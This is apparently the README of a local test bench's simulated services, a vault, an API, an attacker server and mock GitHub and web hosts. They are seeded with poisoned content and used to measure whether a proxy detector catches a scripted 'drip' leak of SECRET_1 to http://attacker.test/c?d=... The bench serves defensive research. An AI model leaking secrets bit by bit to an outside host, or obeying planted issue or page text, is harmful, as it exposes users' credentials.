# services

Servicios simulados del banco de pruebas (área Servicios). Todo es local, con hosts `.test` (ver `contracts/hosts.json`) y secretos sintéticos.

| Servicio | Host | Puerto | Módulo |
|---|---|---|---|
| Gestor de secretos con rotación | `vault.test` | 8101 | `services.vault.app:app` |
| API protegida | `api.empresa.test` | 8102 | `services.api.app:app` |
| Servidor del atacante (verdad de terreno) | `attacker.test` | 8103 | `services.attacker.app:app` |
| GitHub simulado (issues y comentarios) | `github.test` | 8104 | `services.github_sim.app:app` |
| Web simulada (páginas) | `web.test` | 8105 | `services.web_sim.app:app` |

## GitHub y web simulados (2c)

```
uvicorn services.github_sim.app:app --port 8104
uvicorn services.web_sim.app:app --port 8105
```

- **GitHub** (`github.test`): `POST/GET /repos/{owner}/{repo}/issues`, `GET .../issues/{n}`,
  `POST/GET .../issues/{n}/comments`. Es lo que llaman las herramientas `github_issue` y
  `github_comment` del proxy. `GET /_admin/published` devuelve lo que escribieron los
  clientes (no las semillas): los comentarios e issues son un sumidero.
- **Web** (`web.test`): `GET /{ruta}` sirve la página (o 404; `/` sirve `index.html`);
  `PUT /_admin/pages/{ruta}` con el contenido en el cuerpo planta una página;
  `GET /_admin/pages` lista las rutas.
- **Semillas** (contenido legítimo o envenenado; el texto de los ataques es del área Rojo):
  - GitHub: `GITHUB_SIM_SEEDS=<carpeta>` con `*.json` de la forma
    `{"repo": "owner/repo", "issues": [{"title", "body", "comments": [...]}]}`.
  - Web: `WEB_SIM_SEEDS=<carpeta>`; cada archivo se sirve en su ruta relativa.
  - En código: `load_seeds(store, carpeta)` en `services.github_sim.app` y `services.web_sim.app`.
- Todo en memoria: al reiniciar se pierde lo escrito. `python -m services.stack` todavía
  no los levanta (sigue con los tres servicios del paso 9).

Instalación: `pip install -r services/requirements.txt` (más `contracts/`, `engine/` y `proxy/` para el escenario en vivo).

## Levantar los tres servicios

```
python -m services.stack            # hasta Ctrl+C; registros en logs/
```

En código: `with Stack(log_dir="logs") as s: ...` levanta los tres con uvicorn, espera a que respondan y los detiene siempre al salir. Si un puerto está ocupado, falla diciendo cuál.

Variables: `SECRETS_MANIFEST` (valores iniciales, por defecto `demo/secrets_manifest.json`), `VAULT_URL` (la API valida contra el gestor), `API_URL` (el atacante cobra contra la API), `LOG_DIR` (registros), `ATTACKER_BETA_BITS` (bits que el atacante puede adivinar por fuerza bruta, por defecto 64).

## Escenario de goteo en vivo (paso 9)

```
python -m services.scenarios goteo --out logs/goteo
```

Corre el mismo guion dos veces, sin LLM: lee `README.md` y `.env`, y cada 8 llamadas desde la 8 envía 4 caracteres de `SECRET_1` a `http://attacker.test/c?d=...` a través del proxy.

- `<out>/sin/`: proxy que permite todo.
- `<out>/con/`: proxy en vivo con el detector, que rota la clave en el gestor.

Al final el atacante «cobra» contra la API. Resultado típico:

| | sin protección | con protección |
|---|---|---|
| rotaciones | 0 | 1 |
| bits del atacante sobre la clave vigente | 112 | 0 |
| cobro contra la API | 200 | 401 |

Cada carpeta tiene `proxy.jsonl` (decisiones y `rotation`, sin el valor nuevo) y `attacker.jsonl` (lo recibido y el cobro con `data.status`), con el mismo `session_id`.

**El cobro es simulado:** el atacante elige la versión de la clave de la que más bits sabe. Si sabe al menos H − β bits (96 de 160 con β = 64), se supone que adivina el resto por fuerza bruta y prueba la clave real de esa versión. Si no, prueba su mejor suposición parcial. El evento y la respuesta lo dicen con `completed_by_bruteforce` y `bits_known`.

## Tests

```
python -m pytest services -q
```
